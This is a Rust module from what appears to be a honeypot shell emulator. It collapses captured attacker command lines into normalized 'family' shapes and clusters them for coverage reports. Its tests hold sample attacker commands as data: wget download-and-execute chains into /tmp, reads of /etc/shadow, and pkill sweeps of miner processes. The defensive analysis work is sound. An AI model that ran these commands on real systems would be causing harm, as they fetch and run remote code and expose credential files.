//! Shell-emulator coverage metrics, pure core: collapse attacker command lines to a stable
//! family shape, cluster commands by shape, and define the `CoverageReport` data types.
//!
//! Everything here is a pure function of its inputs: no database, filesystem, network or
//! process access. The offline `propolis coverage` subcommand fills a [`CoverageReport`] from the
//! `event` table, and a future doctor `shell-engine.json` collector serializes the same type, so
//! neither needs its own copy of the normalization or the field names.
//!
//! Normalization is a shape heuristic, not a parser: quoting is not tracked, so a `;` or `|`
//! inside a quoted string still splits a segment. The aim is only that two commands which differ
//! in volatile data (a hash, an address, a random drop name) land on the same shape while
//! structurally different commands do not. Every numeric threshold below is `[unverified]`
//! against real captured traffic and should be re-tuned against the private corpus.
//!
//! Rules, applied in this order to the sanitized input (see [`normalize_command`]):
//! 1. URLs (`scheme://...` up to whitespace or a shell metacharacter) become `scheme://<URL>`.
//! 2. IPv4 literals become `<IP>`; so do IPv6 literals (a word of hex digits and colons with a
//!    `::` or exactly seven colons).
//! 3. The line splits into segments at `;`, `|`, `&`, `&&`, `||` and parentheses. Redirections
//!    (`>`, `<`, `2>&1`) stay inside their segment.
//! 4. A `kill`/`pkill`/`killall` segment with at least [`KILL_LIST_MIN`] non-flag arguments, or a
//!    run of at least [`KILL_SWEEP_MIN`] consecutive kill segments, collapses its argument list to
//!    `<LIST>` (flags are kept).
//! 5. Inside every other word, an alphanumeric run becomes `<NUM>` (digits only, at least
//!    [`NUM_MIN`] long), `<HEX>` (hex digits only, at least [`HEX_MIN`] long), or `<NAME>` (a
//!    random-looking token, see `is_random_token`).
//! 6. The last path component of a word becomes `<NAME>` when it carries a payload extension
//!    (see `PAYLOAD_EXTENSIONS`) or is a dotfile outside a short well-known list, and a
//!    command-position `./name` becomes `./<NAME>`.
//! 7. Basenames, flags, operators and directory components are preserved; whitespace collapses
//!    and operators are re-spaced canonically.
//!
//! Output is bounded by [`MAX_SHAPE_LEN`] bytes and input by [`MAX_INPUT_LEN`] bytes.

use std::collections::BTreeMap;

use serde::Serialize;

use crate::sanitize::sanitize_value;
use crate::shell::CommandClass;

/// Longest raw command considered; the remainder is dropped before normalizing.
pub const MAX_INPUT_LEN: usize = 2048;
/// Longest normalized shape returned.
pub const MAX_SHAPE_LEN: usize = 1024;
/// Longest raw example kept per family.
pub const MAX_EXAMPLE_LEN: usize = 256;

/// Minimum length of a digits-only run replaced by `<NUM>`. [unverified]
const NUM_MIN: usize = 6;
/// Minimum length of a hex-only run replaced by `<HEX>` (covers md5/sha digests). [unverified]
const HEX_MIN: usize = 8;
/// Minimum length of an alphanumeric run considered for the random-token test. [unverified]
const RANDOM_MIN: usize = 8;
/// Letter/digit boundary count at which a run reads as random (`a1b2c3d4`). [unverified]
const RANDOM_CLASS_TRANSITIONS: usize = 3;
/// Adjacent upper/lower letter-pair flips at which a run reads as random mixed case. [unverified]
const RANDOM_CASE_TRANSITIONS: usize = 5;
/// Non-flag argument count at which one kill command's list collapses. [unverified]
const KILL_LIST_MIN: usize = 4;
/// Consecutive kill segments at which a process-name sweep collapses. [unverified]
const KILL_SWEEP_MIN: usize = 3;

/// Extensions marking a dropped payload or script; matched case-insensitively. [unverified]
const PAYLOAD_EXTENSIONS: &[&str] = &[
    "sh", "bin", "elf", "exe", "so", "py", "pl", "run", "x86", "x86_64", "arm", "arm5", "arm6",
    "arm7", "mips", "mpsl", "ppc", "sh4", "m68k", "spc", "tar", "gz", "tgz", "bz2", "zip",
];

/// Dotfiles that are ordinary system or user files, not attacker drops; they keep their name.
const WELL_KNOWN_DOTFILES: &[&str] = &[
    "bashrc",
    "bash_profile",
    "bash_logout",
    "bash_history",
    "profile",
    "zshrc",
    "ssh",
    "config",
    "cache",
    "local",
    "viminfo",
];

/// Internal markers for a URL and an IP replaced before tokenizing. Angle-bracket placeholders
/// would be misread as redirection operators, and `sanitize_value` strips control characters from
/// the input first, so neither marker can occur in real input.
const URL_MARK: char = '\u{1}';
const IP_MARK: char = '\u{2}';

/// Count of classified lines per class. Field names are the wire names and match
/// `CommandClass::as_str`.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize)]
pub struct ClassCounts {
    pub supported: u64,
    pub partial: u64,
    pub unknown: u64,
    pub parse_limit: u64,
}

impl ClassCounts {
    pub fn record(&mut self, class: CommandClass) {
        match class {
            CommandClass::Supported => self.supported += 1,
            CommandClass::Partial => self.partial += 1,
            CommandClass::Unknown => self.unknown += 1,
            CommandClass::ParseLimit => self.parse_limit += 1,
        }
    }

    pub fn total(&self) -> u64 {
        self.supported + self.partial + self.unknown + self.parse_limit
    }
}

/// One cluster of commands sharing a normalized shape.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct Family {
    /// The normalized shape (output of [`normalize_command`]); the cluster key.
    pub shape: String,
    /// Commands in the cluster.
    pub count: u64,
    /// One sanitized raw member, at most [`MAX_EXAMPLE_LEN`] bytes. It is the lexicographically
    /// smallest member so the choice does not depend on input order. Raw content: consumers that
    /// must stay normalized-only (the doctor bundle) drop this field.
    pub example: String,
    /// Command-position basenames of the shape, sorted; `<NAME>` stands for a random one.
    pub basenames: Vec<String>,
    /// Per-class breakdown of the members.
    pub classes: ClassCounts,
    /// Fraction of sessions containing this family that later reach a later-stage signal.
    /// `None` until the DB-reading step fills it.
    pub yield_later_stage: Option<f64>,
}

/// One command basename and how often it was seen.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct BasenameStat {
    pub name: String,
    pub count: u64,
    /// Same meaning as [`Family::yield_later_stage`].
    pub yield_later_stage: Option<f64>,
}

/// Inclusive observation window, RFC 3339 strings, either end open when `None`.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct ReportWindow {
    pub from: Option<String>,
    pub to: Option<String>,
}

/// The coverage report. Key names are a stable contract for the `propolis coverage` output and
/// the doctor `shell-engine.json` collector.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct CoverageReport {
    /// RFC 3339 generation time, set by the caller; `None` keeps the report reproducible.
    pub generated_at: Option<String>,
    /// Version of the emulator the classified events came from, as built into this crate.
    pub emulator_version: String,
    pub window: Option<ReportWindow>,
    pub class_counts: ClassCounts,
    pub basenames: Vec<BasenameStat>,
    pub unknown_families: Vec<Family>,
}

impl CoverageReport {
    pub fn new(
        class_counts: ClassCounts,
        basenames: Vec<BasenameStat>,
        unknown_families: Vec<Family>,
    ) -> Self {
        Self {
            generated_at: None,
            emulator_version: env!("CARGO_PKG_VERSION").to_string(),
            window: None,
            class_counts,
            basenames,
            unknown_families,
        }
    }
}

/// Collapse one attacker command line to its family shape. Pure, deterministic and bounded; see
/// the module doc for the rules.
pub fn normalize_command(raw: &str) -> String {
    shape_and_basenames(raw).0
}

/// Group commands by normalized shape. Order is count descending, then shape ascending, so the
/// result is identical for any input order.
pub fn cluster<S: AsRef<str>>(
    commands: impl IntoIterator<Item = (S, CommandClass)>,
) -> Vec<Family> {
    let mut by_shape: BTreeMap<String, Family> = BTreeMap::new();
    for (raw, class) in commands {
        let raw = raw.as_ref();
        let (shape, basenames) = shape_and_basenames(raw);
        let example = sanitize_value(raw, MAX_EXAMPLE_LEN);
        let family = by_shape.entry(shape.clone()).or_insert_with(|| Family {
            shape,
            count: 0,
            example: example.clone(),
            basenames,
            classes: ClassCounts::default(),
            yield_later_stage: None,
        });
        family.count += 1;
        family.classes.record(class);
        if example < family.example {
            family.example = example;
        }
    }
    let mut families: Vec<Family> = by_shape.into_values().collect();
    families.sort_by(|a, b| b.count.cmp(&a.count).then_with(|| a.shape.cmp(&b.shape)));
    families
}

enum Tok {
    Word(String),
    Space,
    Redir(String),
}

struct Segment {
    toks: Vec<Tok>,
    /// The control operator that ended the segment; empty for the last one.
    term: String,
}

fn shape_and_basenames(raw: &str) -> (String, Vec<String>) {
    let clean = sanitize_value(raw, MAX_INPUT_LEN);
    let prepared = replace_ipv4(&replace_urls(&clean));
    let segments = split_segments(&prepared);
    let mut basenames: Vec<String> = Vec::new();
    let mut out = String::new();
    let mut i = 0;
    while i < segments.len() {
        let mut last = i;
        let mut sweep = false;
        if is_kill_segment(&segments[i]) {
            while last + 1 < segments.len()
                && is_kill_segment(&segments[last + 1])
                && segments[last].term != "|"
            {
                last += 1;
            }
            sweep = last - i + 1 >= KILL_SWEEP_MIN;
        }
        if !sweep {
            last = i;
        }
        out.push_str(&render_segment(&segments[i], sweep, &mut basenames));
        push_terminator(&mut out, &segments[last].term);
        i = last + 1;
    }
    let shaped = out
        .trim()
        .replace(URL_MARK, "<URL>")
        .replace(IP_MARK, "<IP>");
    basenames.sort();
    basenames.dedup();
    (sanitize_value(&shaped, MAX_SHAPE_LEN), basenames)
}

fn push_terminator(out: &mut String, term: &str) {
    if term.is_empty() {
        return;
    }
    if term.chars().all(|c| c == '(' || c == ')') {
        out.push_str(term);
    } else if term == ";" {
        out.push_str("; ");
    } else {
        out.push(' ');
        out.push_str(term);
        out.push(' ');
    }
}

fn is_op_char(c: char) -> bool {
    matches!(c, ';' | '|' | '&' | '<' | '>' | '(' | ')')
}

fn split_segments(s: &str) -> Vec<Segment> {
    let mut segments = Vec::new();
    let mut toks: Vec<Tok> = Vec::new();
    let mut chars = s.chars().peekable();
    while let Some(&c) = chars.peek() {
        if c.is_whitespace() {
            while chars.peek().is_some_and(|c| c.is_whitespace()) {
                chars.next();
            }
            toks.push(Tok::Space);
        } else if is_op_char(c) {
            let mut run = String::new();
            while let Some(&c) = chars.peek() {
                if !is_op_char(c) {
                    break;
                }
                run.push(c);
                chars.next();
            }
            if run.contains(['<', '>']) {
                toks.push(Tok::Redir(run));
            } else {
                segments.push(Segment {
                    toks: std::mem::take(&mut toks),
                    term: run,
                });
            }
        } else {
            let mut word = String::new();
            while let Some(&c) = chars.peek() {
                if c.is_whitespace() || is_op_char(c) {
                    break;
                }
                word.push(c);
                chars.next();
            }
            toks.push(Tok::Word(word));
        }
    }
    if toks.iter().any(|t| !matches!(t, Tok::Space)) {
        segments.push(Segment {
            toks,
            term: String::new(),
        });
    }
    segments
}

fn path_basename(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

fn first_word(seg: &Segment) -> Option<&str> {
    seg.toks.iter().find_map(|t| match t {
        Tok::Word(w) => Some(w.as_str()),
        _ => None,
    })
}

fn is_kill_segment(seg: &Segment) -> bool {
    first_word(seg).is_some_and(|w| matches!(path_basename(w), "kill" | "pkill" | "killall"))
}

/// Token indices of the non-flag, non-redirection-target arguments of a kill segment.
fn kill_arg_indices(seg: &Segment) -> Vec<usize> {
    if !is_kill_segment(seg) {
        return Vec::new();
    }
    let mut indices = Vec::new();
    let mut seen_cmd = false;
    let mut after_redir = false;
    for (idx, tok) in seg.toks.iter().enumerate() {
        match tok {
            Tok::Space => {}
            Tok::Redir(_) => after_redir = true,
            Tok::Word(w) => {
                if !seen_cmd {
                    seen_cmd = true;
                } else if after_redir {
                    after_redir = false;
                } else if !w.starts_with('-') {
                    indices.push(idx);
                }
            }
        }
    }
    indices
}

fn is_env_assignment(word: &str) -> bool {
    match word.split_once('=') {
        Some((name, _)) => {
            !name.is_empty()
                && !name.starts_with(|c: char| c.is_ascii_digit())
                && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        }
        None => false,
    }
}

fn render_segment(seg: &Segment, sweep: bool, basenames: &mut Vec<String>) -> String {
    let kill_args = kill_arg_indices(seg);
    let collapse = !kill_args.is_empty() && (sweep || kill_args.len() >= KILL_LIST_MIN);
    let mut out = String::new();
    let mut pending_space = false;
    let mut cmd_pos = true;
    let mut after_redir = false;
    for (idx, tok) in seg.toks.iter().enumerate() {
        match tok {
            Tok::Space => pending_space = !out.is_empty(),
            Tok::Redir(op) => {
                if pending_space {
                    out.push(' ');
                    pending_space = false;
                }
                out.push_str(op);
                after_redir = true;
            }
            Tok::Word(w) => {
                let text = if collapse && kill_args.contains(&idx) {
                    if idx != kill_args[0] {
                        continue;
                    }
                    "<LIST>".to_string()
                } else if after_redir {
                    after_redir = false;
                    normalize_word(w, false)
                } else if cmd_pos && !is_env_assignment(w) {
                    cmd_pos = false;
                    let norm = normalize_word(w, true);
                    let base = path_basename(&norm);
                    if !base.is_empty() {
                        basenames.push(base.to_string());
                    }
                    norm
                } else {
                    normalize_word(w, false)
                };
                if pending_space {
                    out.push(' ');
                    pending_space = false;
                }
                out.push_str(&text);
            }
        }
    }
    out
}

fn normalize_word(word: &str, cmd_pos: bool) -> String {
    if word.starts_with('-') {
        return match word.split_once('=') {
            Some((flag, value)) => {
                format!("{}={}", replace_runs(flag), normalize_word(value, false))
            }
            None => replace_runs(word),
        };
    }
    if is_ipv6(word) {
        return "<IP>".to_string();
    }
    if cmd_pos
        && word.len() > 2
        && let Some(name) = word.strip_prefix("./")
        && !name.contains('/')
    {
        return "./<NAME>".to_string();
    }
    let comps: Vec<&str> = word.split('/').collect();
    let last = comps.len() - 1;
    comps
        .iter()
        .enumerate()
        .map(|(i, c)| normalize_component(c, i == last))
        .collect::<Vec<_>>()
        .join("/")
}

fn normalize_component(comp: &str, is_last: bool) -> String {
    if comp.is_empty() || comp == "." || comp == ".." {
        return comp.to_string();
    }
    if is_last {
        if let Some((stem, ext)) = comp.rsplit_once('.')
            && !stem.is_empty()
            && PAYLOAD_EXTENSIONS.contains(&ext.to_ascii_lowercase().as_str())
        {
            return "<NAME>".to_string();
        }
        if let Some(rest) = comp.strip_prefix('.')
            && !rest.is_empty()
            && !rest.starts_with('.')
            && !WELL_KNOWN_DOTFILES.contains(&rest)
        {
            return "<NAME>".to_string();
        }
    }
    replace_runs(comp)
}

/// Replace each alphanumeric run with its placeholder when it is numeric, hex or random-looking;
/// everything between runs is kept.
fn replace_runs(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut run = String::new();
    for c in s.chars() {
        if c.is_ascii_alphanumeric() {
            run.push(c);
        } else {
            flush_run(&mut out, &mut run);
            out.push(c);
        }
    }
    flush_run(&mut out, &mut run);
    out
}

fn flush_run(out: &mut String, run: &mut String) {
    if run.is_empty() {
        return;
    }
    let all_digits = run.chars().all(|c| c.is_ascii_digit());
    if all_digits && run.len() >= NUM_MIN {
        out.push_str("<NUM>");
    } else if run.len() >= HEX_MIN && run.chars().all(|c| c.is_ascii_hexdigit()) {
        out.push_str("<HEX>");
    } else if is_random_token(run) {
        out.push_str("<NAME>");
    } else {
        out.push_str(run);
    }
    run.clear();
}

/// Random-looking token heuristic over one alphanumeric run: long enough and either alternating
/// between letters and digits, alternating upper/lower case, or all letters with no vowel.
/// `sha256sum` (two letter/digit boundaries) and `NetworkManager` (three case flips) stay plain.
/// [unverified] thresholds.
fn is_random_token(run: &str) -> bool {
    if run.len() < RANDOM_MIN {
        return false;
    }
    let chars: Vec<char> = run.chars().collect();
    let class_flips = chars
        .windows(2)
        .filter(|w| w[0].is_ascii_digit() != w[1].is_ascii_digit())
        .count();
    let case_flips = chars
        .windows(2)
        .filter(|w| {
            w[0].is_ascii_alphabetic()
                && w[1].is_ascii_alphabetic()
                && w[0].is_ascii_uppercase() != w[1].is_ascii_uppercase()
        })
        .count();
    let vowelless = chars.iter().all(|c| c.is_ascii_alphabetic())
        && !chars.iter().any(|c| "aeiouAEIOU".contains(*c));
    class_flips >= RANDOM_CLASS_TRANSITIONS || case_flips >= RANDOM_CASE_TRANSITIONS || vowelless
}

fn is_ipv6(word: &str) -> bool {
    let stripped: String = word
        .chars()
        .filter(|c| !matches!(c, '[' | ']' | '"' | '\''))
        .collect();
    let addr = stripped.split('/').next().unwrap_or("");
    let colons = addr.matches(':').count();
    colons >= 2
        && (addr.contains("::") || colons == 7)
        && addr.chars().any(|c| c.is_ascii_hexdigit())
        && addr
            .chars()
            .all(|c| c.is_ascii_hexdigit() || c == ':' || c == '.')
}

/// Replace every `scheme://...` with `scheme://` plus the URL marker. The URL ends at whitespace
/// or a shell metacharacter (not `&`, which is common inside a query string).
fn replace_urls(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(i) = rest.find("://") {
        let head = &rest[..i];
        let scheme_start = head
            .char_indices()
            .rev()
            .find(|(_, c)| !(c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-')))
            .map_or(0, |(p, c)| p + c.len_utf8());
        let scheme = &head[scheme_start..];
        let after = &rest[i + 3..];
        let end = after
            .find(|c: char| {
                c.is_whitespace()
                    || matches!(c, '"' | '\'' | '<' | '>' | ';' | '|' | '(' | ')' | '`')
            })
            .unwrap_or(after.len());
        if !scheme.starts_with(|c: char| c.is_ascii_alphabetic()) || end == 0 {
            out.push_str(&rest[..i + 3]);
            rest = after;
            continue;
        }
        out.push_str(&rest[..scheme_start]);
        out.push_str(&scheme.to_ascii_lowercase());
        out.push_str("://");
        out.push(URL_MARK);
        rest = &after[end..];
    }
    out.push_str(rest);
    out
}

fn is_ipv4(run: &str) -> bool {
    let parts: Vec<&str> = run.split('.').collect();
    parts.len() == 4
        && parts.iter().all(|p| {
            (1..=3).contains(&p.len())
                && p.chars().all(|c| c.is_ascii_digit())
                && p.parse::<u16>().is_ok_and(|n| n <= 255)
        })
}

/// Replace dotted-quad IPv4 literals not embedded in a longer alphanumeric token or number.
fn replace_ipv4(s: &str) -> String {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < chars.len() {
        let boundary = i == 0 || !(chars[i - 1].is_ascii_alphanumeric() || chars[i - 1] == '.');
        if chars[i].is_ascii_digit() && boundary {
            let mut end = i;
            while end < chars.len() && (chars[end].is_ascii_digit() || chars[end] == '.') {
                end += 1;
            }
            while end > i && chars[end - 1] == '.' {
                end -= 1;
            }
            let run: String = chars[i..end].iter().collect();
            let glued = end < chars.len() && chars[end].is_ascii_alphanumeric();
            if is_ipv4(&run) && !glued {
                out.push(IP_MARK);
            } else {
                out.push_str(&run);
            }
            i = end;
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn n(raw: &str) -> String {
        normalize_command(raw)
    }

    #[test]
    fn hash_ip_and_drop_name_variants_share_one_shape() {
        let a = "wget http://203.0.113.5/a.sh -O /tmp/Qw3Er5Ty7U; sh /tmp/Qw3Er5Ty7U";
        let b = "wget http://198.51.100.9/zz/b.sh -O /tmp/Mn8Bv6Cx4Z; sh /tmp/Mn8Bv6Cx4Z";
        assert_eq!(n(a), "wget http://<URL> -O /tmp/<NAME>; sh /tmp/<NAME>");
        assert_eq!(n(a), n(b));
        assert_ne!(a, b);

        let h1 = "echo 5f4dcc3b5aa765d61d8327deb882cf99 | md5sum";
        let h2 = "echo 098f6bcd4621d373cade4e832627b4f6 | md5sum";
        assert_eq!(n(h1), "echo <HEX> | md5sum");
        assert_eq!(n(h1), n(h2));

        assert_eq!(n("ssh root@192.0.2.55 -p 2222"), "ssh root@<IP> -p 2222");
        assert_eq!(n("ping 2001:db8::1"), "ping <IP>");
    }

    #[test]
    fn structurally_different_commands_keep_different_shapes() {
        assert_ne!(
            n("wget http://203.0.113.5/a.sh | sh"),
            n("wget http://203.0.113.5/a.sh; sh")
        );
        assert_ne!(
            n("curl http://203.0.113.5/a"),
            n("wget http://203.0.113.5/a")
        );
        assert_ne!(n("cat /etc/passwd"), n("cat /etc/shadow"));
        assert_ne!(n("sh a.sh"), n("bash a.sh"));
    }

    #[test]
    fn clean_commands_pass_through_unchanged() {
        for cmd in [
            "uname -a",
            "cat /etc/passwd | grep root > /tmp/out.txt",
            "chmod +x busybox",
            "chmod +x systemctl",
            "cat ~/.bashrc",
            "ls ~/.ssh/authorized_keys",
            "sleep 60",
            "sleep 12345",
            "echo deadbee",
            "sha256sum -c list",
            "echo NetworkManager",
            "kill -9 1234",
            "killall a b c",
            "pkill a; pkill b",
        ] {
            assert_eq!(n(cmd), cmd, "over-normalized {cmd:?}");
        }
    }

    #[test]
    fn operators_flags_and_basenames_survive() {
        assert_eq!(
            n("cd /tmp; wget http://203.0.113.9/bins/x86.sh && chmod 777 x86.sh && ./x86.sh"),
            "cd /tmp; wget http://<URL> && chmod 777 <NAME> && ./<NAME>"
        );
        assert_eq!(n("a&&b||c|d"), "a && b || c | d");
        assert_eq!(n("a  ;  b"), "a; b");
        assert_eq!(n("ls  -la   /x 2>&1"), "ls -la /x 2>&1");
        assert_eq!(n("echo $(cat /etc/hostname)"), "echo $(cat /etc/hostname)");
    }

    #[test]
    fn numeric_hex_and_random_thresholds_are_discriminating() {
        assert_eq!(n("sleep 1234567"), "sleep <NUM>");
        assert_eq!(n("echo deadbeef"), "echo <HEX>");
        assert_eq!(n("chmod +x aB3dE9fGh2"), "chmod +x <NAME>");
        assert_eq!(n("cat xhzqkwprtv"), "cat <NAME>");
        assert_eq!(n("cp x /tmp/.q9w8e7r6"), "cp x /tmp/<NAME>");
        assert_eq!(n("./x86"), "./<NAME>");
        assert_eq!(n("--output=/tmp/aB3dE9fGh2"), "--output=/tmp/<NAME>");
    }

    #[test]
    fn kill_lists_and_sweeps_collapse_to_one_marker() {
        let sweep = "pkill -9 xmrig; pkill -9 kdevtmpfsi; pkill -9 minerd; pkill -9 cryptonight";
        let other = "pkill -9 kinsing; pkill -9 dbused; pkill -9 sysguard";
        assert_eq!(n(sweep), "pkill -9 <LIST>");
        assert_eq!(n(sweep), n(other));
        assert_eq!(n("killall -9 a b c d e"), "killall -9 <LIST>");
        assert_eq!(n("killall -9 a b c d e"), n("killall -9 w x y z q r"));
        assert_eq!(
            n("killall a b c d > /dev/null"),
            "killall <LIST> > /dev/null"
        );
        assert_eq!(
            n("pkill x; pkill y; pkill z; wget http://203.0.113.5/a"),
            "pkill <LIST>; wget http://<URL>"
        );
        assert_ne!(n("kill -9 1"), n("kill -9 1 2 3 4"));
    }

    #[test]
    fn output_is_bounded_and_deterministic_on_hostile_input() {
        let huge = "a1b2c3d4 ".repeat(50_000);
        let shape = n(&huge);
        assert!(shape.len() <= MAX_SHAPE_LEN);
        assert_eq!(shape, n(&huge));
        let weird = "echo h\u{e9}llo \u{2713} http://\u{fc}n\u{ef}.example/\u{e9} \u{1}\u{2}";
        assert_eq!(n(weird), "echo h\u{e9}llo \u{2713} http://<URL>");
        assert_eq!(n(""), "");
        assert_eq!(n("  ;; "), ";;");
    }

    #[test]
    fn cluster_groups_by_shape_with_counts_classes_and_order() {
        let fetch = [
            "wget http://203.0.113.5/a.sh -O /tmp/Qw3Er5Ty7U; sh /tmp/Qw3Er5Ty7U",
            "wget http://198.51.100.9/zz/b.sh -O /tmp/Mn8Bv6Cx4Z; sh /tmp/Mn8Bv6Cx4Z",
            "wget http://192.0.2.77/c.sh -O /tmp/Lp0Ok9Ij8U; sh /tmp/Lp0Ok9Ij8U",
        ];
        let input = vec![
            ("uname -a", CommandClass::Partial),
            (fetch[0], CommandClass::Unknown),
            ("cat /etc/shadow", CommandClass::Unknown),
            (fetch[1], CommandClass::ParseLimit),
            (fetch[2], CommandClass::Unknown),
            ("cat /etc/passwd", CommandClass::Unknown),
        ];
        let families = cluster(input.clone());
        assert_eq!(families.len(), 4);
        assert_eq!(
            families[0].shape,
            "wget http://<URL> -O /tmp/<NAME>; sh /tmp/<NAME>"
        );
        assert_eq!(families[0].count, 3);
        assert_eq!(families[0].classes.unknown, 2);
        assert_eq!(families[0].classes.parse_limit, 1);
        assert_eq!(families[0].classes.total(), 3);
        assert_eq!(
            families[0].basenames,
            vec!["sh".to_string(), "wget".to_string()]
        );
        assert_eq!(families[0].yield_later_stage, None);
        // Remaining families tie on count 1: ordered by shape ascending.
        let tail: Vec<&str> = families[1..].iter().map(|f| f.shape.as_str()).collect();
        assert_eq!(tail, ["cat /etc/passwd", "cat /etc/shadow", "uname -a"]);
        // Total count and order are independent of input order.
        let mut reversed = input;
        reversed.reverse();
        assert_eq!(cluster(reversed), families);
        assert_eq!(families.iter().map(|f| f.count).sum::<u64>(), 6);
    }

    #[test]
    fn family_example_is_sanitized_bounded_and_order_independent() {
        let dirty = "echo hi\r\n\u{1b}[31mX\u{202e}";
        let long = format!("echo {}", "z".repeat(5000));
        let fams = cluster([
            (dirty, CommandClass::Unknown),
            (long.as_str(), CommandClass::Unknown),
        ]);
        let dirty_family = fams
            .iter()
            .find(|f| f.shape == "echo hi X")
            .expect("dirty family");
        assert_eq!(dirty_family.example, "echo hi X");
        let long_family = fams
            .iter()
            .find(|f| f.shape != "echo hi X")
            .expect("long family");
        assert!(long_family.example.len() <= MAX_EXAMPLE_LEN);
        assert!(long_family.example.starts_with("echo zzz"));

        let a = "wget http://203.0.113.5/a.sh -O /tmp/Qw3Er5Ty7U";
        let b = "wget http://203.0.113.6/b.sh -O /tmp/Mn8Bv6Cx4Z";
        let forward = cluster([(a, CommandClass::Unknown), (b, CommandClass::Unknown)]);
        let backward = cluster([(b, CommandClass::Unknown), (a, CommandClass::Unknown)]);
        assert_eq!(forward.len(), 1);
        assert_eq!(forward[0].example, backward[0].example);
        assert_eq!(forward[0].example, a);
    }

    #[test]
    fn coverage_report_serializes_with_stable_keys_and_null_yields() {
        let mut classes = ClassCounts::default();
        for class in [
            CommandClass::Supported,
            CommandClass::Partial,
            CommandClass::Partial,
            CommandClass::Unknown,
            CommandClass::Unknown,
            CommandClass::Unknown,
            CommandClass::ParseLimit,
            CommandClass::ParseLimit,
            CommandClass::ParseLimit,
            CommandClass::ParseLimit,
        ] {
            classes.record(class);
        }
        let families = cluster([("cat /etc/shadow", CommandClass::Unknown)]);
        let mut report = CoverageReport::new(
            classes,
            vec![BasenameStat {
                name: "curl".to_string(),
                count: 5,
                yield_later_stage: None,
            }],
            families,
        );
        assert_eq!(report.emulator_version, env!("CARGO_PKG_VERSION"));
        assert!(!report.emulator_version.is_empty());

        assert_eq!(
            serde_json::to_value(&report).unwrap(),
            json!({
                "generated_at": null,
                "emulator_version": env!("CARGO_PKG_VERSION"),
                "window": null,
                "class_counts": {"supported": 1, "partial": 2, "unknown": 3, "parse_limit": 4},
                "basenames": [{"name": "curl", "count": 5, "yield_later_stage": null}],
                "unknown_families": [{
                    "shape": "cat /etc/shadow",
                    "count": 1,
                    "example": "cat /etc/shadow",
                    "basenames": ["cat"],
                    "classes": {"supported": 0, "partial": 0, "unknown": 1, "parse_limit": 0},
                    "yield_later_stage": null
                }]
            })
        );

        report.generated_at = Some("2026-10-04T00:00:00Z".to_string());
        report.window = Some(ReportWindow {
            from: Some("2026-09-01T00:00:00Z".to_string()),
            to: None,
        });
        report.basenames[0].yield_later_stage = Some(0.25);
        let value = serde_json::to_value(&report).unwrap();
        assert_eq!(value["generated_at"], "2026-10-04T00:00:00Z");
        assert_eq!(
            value["window"],
            json!({"from": "2026-09-01T00:00:00Z", "to": null})
        );
        assert_eq!(value["basenames"][0]["yield_later_stage"], 0.25);
    }

    #[test]
    fn class_counts_wire_names_match_command_class_strings() {
        for class in [
            CommandClass::Supported,
            CommandClass::Partial,
            CommandClass::Unknown,
            CommandClass::ParseLimit,
        ] {
            let mut counts = ClassCounts::default();
            counts.record(class);
            let value = serde_json::to_value(counts).unwrap();
            assert_eq!(value[class.as_str()], 1, "{class:?}");
            assert_eq!(counts.total(), 1);
        }
    }
}
